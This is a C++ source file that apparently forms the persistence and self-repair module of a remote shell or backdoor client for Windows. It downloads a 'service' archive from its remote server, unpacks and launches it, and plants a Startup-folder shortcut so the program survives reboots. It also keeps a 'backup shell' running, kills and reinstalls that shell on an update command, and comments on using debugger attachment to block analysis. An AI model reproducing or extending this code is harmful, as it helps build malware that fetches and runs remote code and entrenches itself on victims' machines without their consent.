#include "serviceutils.h"
#include "client.h"
#include "utils.h"

Shortcut shManager;

bool Service::ServiceExists(LPCSTR lpServiceName) {
	return FileExists(ShellServicePath(lpServiceName).c_str());
}

bool Service::ServiceLinkExists()
{
	return FileExists(STARTUP_PATH(SERVICE_LINK_NAME));
}

void Service::StartServiceIfNeeded(LPCSTR lpServiceName)
{
	if (Utils::getProcess(lpServiceName)) {
		return;
	}
	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&info, sizeof(info));
	ZeroMemory(&processInfo, sizeof(processInfo));
	//Create process with debugging flag, since only one debugger can be attached to a process at a time, the shell will "debug itself"
	while (!CreateProcessA(ShellServicePath(lpServiceName).c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
	{
		Log("Failed to start service\n");
		Sleep(100);
	}
	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);
}

void Service::CheckAndRepairService(bool called_itself)
{
	auto service_dir = ShellServiceDirectory();
	if (!FolderExist(service_dir)) {
		fs::create_directory(service_dir);
	}
	if (!ServiceExists(SERVICE_FILE_NAME)) {
		Log("Service doesn't exist, downloading it...\n");
		auto archive_path = ShellServicePath(SERVICE_FILE_NAME);
		
		int i = 0;
		while (!Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME), true)) {
			if (i > 9)
				return;
			Client::main_client.RequestFile(std::string(SERVICE_ARCHIVE_NAME), true);
			i++;
		}
		//Wait for file existence
		while (GetFileAttributesA(SHELL_PATH(SERVICE_ARCHIVE_NAME)) == INVALID_FILE_ATTRIBUTES) {
			if (!Client::connected)
				return;
			Sleep(100);
		}
		//while (!rename(SHELL_PATH(SERVICE_ARCHIVE_NAME), archive_path.c_str())) {
		//	Log("Could not move downloaded archive\n");
		//	Sleep(100);
		//}
		//Log("Moved archive\n");
		//Unzip archive
		while (!unzip(SHELL_PATH(SERVICE_ARCHIVE_NAME), service_dir + "\\")) {
			Log("Could not unzip archive\n");
			Sleep(1000);
		}
		Log("Extracted archive\n");
		//Delete archive
		remove(SHELL_PATH(SERVICE_ARCHIVE_NAME));
		Log("Removed archive\n");
	}
	if (!Service::ServiceLinkExists()) {
		//Create service
		while (!InstallService(SERVICE_FILE_NAME)) {
			Log("Could not install service\n");
			Sleep(1000);
		}
		Log("Service installed in startup\n");
	}
	else {
		Log("Service link exists\n");
	}

	//Start the service
	Service::StartServiceIfNeeded(SERVICE_FILE_NAME);

	if (FileExists(SHELL_PATH(SHELL_UPDATE_NAME)) && !called_itself) { //This means that an update instruction has been sent and therefore backup shell needs to shutdown once the service has been started
		//Delete the service and let checker recreate it at next iteration of the main loop
		HANDLE hProc = 0;
		auto procID = Utils::getProcess(SERVICE_FILE_NAME);
		if (procID) {
			Log("Found service process ID\n");
			const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
			TerminateProcess(hBackupShell, 1);
			CloseHandle(hBackupShell);
		}
		else {
			Log("Could not find service process ID\n");
		}

		while (remove(ShellServicePath(SERVICE_FILE_NAME).c_str())) {
			Log("Couldn't remove service file\n");
			Sleep(100);
		}


		//remove(SHELL_PATH(SHELL_UPDATE_NAME));
		Log("Deleted service\n");
		CheckAndRepairService(true);

		PauseAndExit(10);
	}
}

bool Service::InstallService(LPCSTR lpServiceName)
{
	return SUCCEEDED(shManager.CreateLink(ShellServicePath(SERVICE_FILE_NAME).c_str(), STARTUP_PATH(SERVICE_LINK_NAME), SERVICE_NAME));
}